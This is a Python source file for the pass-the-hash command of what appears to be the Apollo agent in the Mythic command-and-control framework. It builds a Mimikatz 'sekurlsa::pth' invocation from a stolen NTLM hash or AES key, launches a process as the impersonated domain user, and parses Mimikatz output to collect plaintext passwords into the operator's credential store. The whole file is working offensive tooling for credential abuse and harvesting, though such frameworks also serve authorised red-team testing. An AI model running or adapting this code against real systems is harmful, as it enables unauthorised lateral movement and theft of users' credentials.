from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import mslex
import re
from .execute_pe import *


def valid_ntlm_hash(hash):
    return re.match(r"^[a-zA-Z0-9]{32}$", hash) is not None


def valid_aes128_key(key):
    return re.match(r"^[a-zA-Z0-9]{32}$", key) is not None


def valid_aes256_key(key):
    return re.match(r"^[a-zA-Z0-9]{64}$", key) is not None


class PthArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                description="Saved credential of the user to impersonate (either an NTLM hash or AES key).",
                limit_credentials_by_type=["hash"],
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1, required=True, group_name="Credential"
                    )
                ],
            ),
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain associated with user.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="NTLM", ui_position=1, required=True),
                    ParameterGroupInfo(
                        group_name="AES128", ui_position=1, required=True
                    ),
                    ParameterGroupInfo(
                        group_name="AES256", ui_position=1, required=True
                    ),
                ],
            ),
            CommandParameter(
                name="user",
                cli_name="User",
                display_name="User",
                type=ParameterType.String,
                description="Username associated with the NTLM hash.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="NTLM", ui_position=2, required=True),
                    ParameterGroupInfo(
                        group_name="AES128", ui_position=2, required=True
                    ),
                    ParameterGroupInfo(
                        group_name="AES256", ui_position=2, required=True
                    ),
                ],
            ),
            CommandParameter(
                name="ntlm",
                cli_name="NTLM",
                display_name="NTLM",
                type=ParameterType.String,
                description="User's NTLM hash.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="NTLM", ui_position=3, required=True),
                ],
            ),
            CommandParameter(
                name="aes128",
                cli_name="AES128",
                display_name="AES128",
                type=ParameterType.String,
                description="AES128 key of user. Used for over pass the hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="AES128", ui_position=3, required=True
                    )
                ],
            ),
            CommandParameter(
                name="aes256",
                cli_name="AES256",
                display_name="AES256",
                type=ParameterType.String,
                description="AES256 key of user. Used for over pass the hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="AES256", ui_position=3, required=True
                    )
                ],
            ),
            CommandParameter(
                name="run",
                cli_name="Run",
                display_name="Program to Run",
                type=ParameterType.String,
                description="The process to launch under the specified credentials.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="NTLM", ui_position=4, required=False
                    ),
                    ParameterGroupInfo(
                        group_name="AES128", ui_position=4, required=False
                    ),
                    ParameterGroupInfo(
                        group_name="AES256", ui_position=4, required=False
                    ),
                    ParameterGroupInfo(
                        group_name="Credential", ui_position=2, required=False
                    ),
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)

            if credential := self.get_arg("credential"):
                if realm := credential["realm"]:
                    self.set_arg("domain", realm)
                else:
                    raise RuntimeError(
                        "Realm value in the selected credential is empty."
                    )

                if account := credential["account"]:
                    self.set_arg("user", account)
                else:
                    raise RuntimeError(
                        "Account value in the selected credential is empty."
                    )

                if credential["type"] == "key":
                    cred_key = credential["credential"]

                    if valid_aes128_key(cred_key):
                        self.set_arg("aes128", cred_key)
                        self.parameter_group_name = "AES128"
                    elif valid_aes256_key(cred_key):
                        self.set_arg("aes256", cred_key)
                        self.parameter_group_name = "AES256"
                    else:
                        raise ValueError(
                            "Selected credential is not a valid AES128 or AES256 key."
                        )
                else:   # TODO: Add hash credential type check when Apollo supports tagging
                    # credential types in Mimikatz output
                    ntlm_hash = credential["credential"]
                    if not valid_ntlm_hash(ntlm_hash):
                        raise ValueError(
                            "Selected credential is not a valid NTLM hash."
                        )

                    self.set_arg("ntlm", ntlm_hash)
                    self.parameter_group_name = "NTLM"
        else:
            raise Exception(
                "No mimikatz command given to execute.\n\tUsage: {}".format(
                    PthCommand.help_cmd
                )
            )


async def parse_credentials(
    task: PTTaskCompletionFunctionMessage,
) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(
        Success=True, TaskStatus="success", Completed=True
    )
    responses = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
    )
    for output in responses.Responses:
        mimikatz_out = str(output.Response)
        comment = "task {}".format(output.TaskID)
        if mimikatz_out != "":
            lines = mimikatz_out.split("\r\n")

            for i in range(len(lines)):
                line = lines[i]
                if "Username" in line:
                    # Check to see if Password is null
                    if i + 2 >= len(lines):
                        break
                    uname = line.split(" : ")[1].strip()
                    realm = lines[i + 1].split(" : ")[1].strip()
                    passwd = lines[i + 2].split(" : ")[1].strip()
                    if passwd != "(null)":
                        cred_resp = await SendMythicRPCCredentialCreate(
                            MythicRPCCredentialCreateMessage(
                                TaskID=task.TaskData.Task.ID,
                                Credentials=[
                                    MythicRPCCredentialData(
                                        credential_type="plaintext",
                                        account=uname,
                                        realm=realm,
                                        credential=passwd,
                                        comment=comment,
                                    )
                                ],
                            )
                        )
                        if not cred_resp.Success:
                            raise Exception("Failed to register credential")
    return response


class PthCommand(CommandBase):
    cmd = "pth"
    attributes = CommandAttributes(dependencies=["execute_pe"], alias=True)
    needs_admin = False
    help_cmd = "pth -Domain [domain] -User [user] -NTLM [ntlm] [-AES128 [aes128] -AES256 [aes256] -Run [cmd.exe]]"
    description = (
        "Spawn a new process using the specified domain user's credential material."
    )
    version = 4
    author = "@djhohnstein"
    argument_class = PthArguments
    attackmapping = ["T1550"]
    script_only = False
    completion_functions = {"parse_credentials": parse_credentials}

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        user = taskData.args.get_arg("user")
        domain = taskData.args.get_arg("domain")

        arguments = f"/user:{user} /domain:{domain}"

        match taskData.args.get_parameter_group_name():
            case "NTLM":
                ntlm = taskData.args.get_arg("ntlm")
                arguments += f" /ntlm:{ntlm}"
            case "AES128":
                aes128 = taskData.args.get_arg("aes128")
                arguments += f" /aes128:{aes128}"
            case "AES256":
                aes256 = taskData.args.get_arg("aes256")
                arguments += f" /aes256:{aes256}"
            case _:
                raise Exception(f"Invalid parameter group name from Mythic: {taskData.args.get_parameter_group_name()}")

        if run := taskData.args.get_arg("run"):
            run = mslex.quote(run, for_cmd = False)
            arguments += f" /run:{run}"

        arguments = "sekurlsa::pth " + arguments
        executePEArgs = ExecutePEArguments(command_line=json.dumps({
            "pe_name": "mimikatz.exe",
            "pe_arguments": mslex.quote(arguments, for_cmd = False),
        }))
        await executePEArgs.parse_arguments()
        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
                                            agent_code_path=self.agent_code_path,
                                            agent_browserscript_path=self.agent_browserscript_path)
        # set our taskData args to be the new ones for execute_pe
        taskData.args = executePEArgs
        # executePE's creat_go_tasking function returns a response for us
        newResp = await executePECommand.create_go_tasking(taskData=taskData)
        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
        newResp.CommandName = "execute_pe"
        newResp.DisplayParams = arguments
        newResp.CompletionFunctionName = "parse_credentials"
        return newResp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
